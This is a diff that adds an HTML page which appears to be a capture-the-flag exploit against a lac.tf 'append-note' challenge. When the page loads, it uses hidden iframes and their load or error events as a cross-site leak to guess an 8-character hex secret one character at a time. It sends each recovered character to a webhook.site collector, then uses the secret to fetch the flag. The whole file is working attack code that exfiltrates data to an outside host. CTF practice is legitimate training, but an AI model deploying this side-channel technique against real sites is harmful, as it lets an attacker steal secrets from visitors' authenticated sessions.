@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <h1>Processing...</h1>
+    <div id="status">Initializing...</div>
+    
+    <script>
+        // ============================================================
+        // CONFIGURATION
+        // ============================================================
+        const TARGET = 'https://append-note-edo1c.instancer.lac.tf';
+        const WEBHOOK = 'https://webhook.site/c71a4e87-4bc8-48b5-baff-03c29ee59baa';
+        
+        // ============================================================
+        // EXPLOIT CODE
+        // ============================================================
+        const HEX = '0123456789abcdef';
+        let secret = '';
+        let attempts = 0;
+
+        function updateStatus(msg) {
+            document.getElementById('status').textContent = msg;
+            console.log(msg);
+        }
+
+        async function sendWebhook(data) {
+            try {
+                const params = new URLSearchParams(data);
+                await fetch(`${WEBHOOK}?${params}`, { mode: 'no-cors' });
+            } catch (e) {
+                console.log('Webhook error:', e);
+            }
+        }
+
+        async function testChar(prefix, char) {
+            return new Promise((resolve) => {
+                attempts++;
+                const iframe = document.createElement('iframe');
+                const test = prefix + char;
+                
+                // The key: Status code affects response behavior
+                // 200 (match) vs 404 (no match)
+                iframe.src = `${TARGET}/append?content=${encodeURIComponent(test)}&url=${encodeURIComponent(TARGET + '/')}`;
+                
+                let resolved = false;
+                
+                // On successful load (likely means 200 status)
+                iframe.onload = () => {
+                    if (!resolved) {
+                        resolved = true;
+                        setTimeout(() => resolve(true), 100);
+                    }
+                };
+                
+                // On error (might indicate different status)
+                iframe.onerror = () => {
+                    if (!resolved) {
+                        resolved = true;
+                        resolve(false);
+                    }
+                };
+                
+                // Timeout as fallback
+                setTimeout(() => {
+                    if (!resolved) {
+                        resolved = true;
+                        resolve(false);
+                    }
+                    try { 
+                        document.body.removeChild(iframe); 
+                    } catch {}
+                }, 1500);
+                
+                iframe.style.display = 'none';
+                iframe.style.position = 'absolute';
+                iframe.style.width = '1px';
+                iframe.style.height = '1px';
+                document.body.appendChild(iframe);
+            });
+        }
+
+        async function extract() {
+            updateStatus('Starting SECRET extraction...');
+            await sendWebhook({ event: 'start', timestamp: Date.now() });
+            
+            // Extract 8 hex characters
+            for (let i = 0; i < 8; i++) {
+                updateStatus(`Extracting character ${i + 1}/8... Current: ${secret}`);
+                let found = false;
+                
+                for (let c of HEX) {
+                    const isMatch = await testChar(secret, c);
+                    
+                    if (isMatch) {
+                        secret += c;
+                        updateStatus(`Found char ${i + 1}: ${c} -> ${secret}`);
+                        await sendWebhook({ 
+                            secret: secret,
+                            position: i + 1,
+                            char: c,
+                            timestamp: Date.now()
+                        });
+                        found = true;
+                        break;
+                    }
+                    
+                    // Small delay to avoid overwhelming
+                    await new Promise(r => setTimeout(r, 50));
+                }
+                
+                if (!found) {
+                    updateStatus(`ERROR: No match at position ${i + 1}`);
+                    await sendWebhook({ 
+                        error: `No match at position ${i + 1}`,
+                        secret_partial: secret,
+                        timestamp: Date.now()
+                    });
+                    return;
+                }
+            }
+            
+            updateStatus(`Extraction complete! SECRET: ${secret}`);
+            await sendWebhook({ 
+                secret: secret,
+                complete: true,
+                attempts: attempts,
+                timestamp: Date.now()
+            });
+            
+            // Now get the flag
+            await getFlag();
+        }
+
+        async function getFlag() {
+            updateStatus(`Getting flag with SECRET: ${secret}`);
+            
+            try {
+                const resp = await fetch(`${TARGET}/flag?secret=${secret}`);
+                const flag = await resp.text();
+                
+                updateStatus(`SUCCESS! FLAG: ${flag}`);
+                await sendWebhook({ 
+                    flag: flag,
+                    secret: secret,
+                    timestamp: Date.now()
+                });
+                
+                // Display prominently
+                document.body.innerHTML = `
+                    <div style="font-family: monospace; padding: 20px; background: #000; color: #0f0;">
+                        <h1 style="color: #0f0;">🎉 SUCCESS! 🎉</h1>
+                        <h2>SECRET: ${secret}</h2>
+                        <h2>FLAG: ${flag}</h2>
+                        <p>Check your webhook for details!</p>
+                    </div>
+                `;
+            } catch (e) {
+                updateStatus(`Error getting flag: ${e.message}`);
+                await sendWebhook({ 
+                    error: `Flag fetch failed: ${e.message}`,
+                    secret: secret,
+                    timestamp: Date.now()
+                });
+            }
+        }
+
+        // Start the exploit after a short delay
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                updateStatus('Page loaded, starting exploit...');
+                extract().catch(e => {
+                    updateStatus(`Fatal error: ${e.message}`);
+                    sendWebhook({ fatal_error: e.message, stack: e.stack });
+                });
+            }, 500);
+        });
+    </script>
+</body>
+</html>
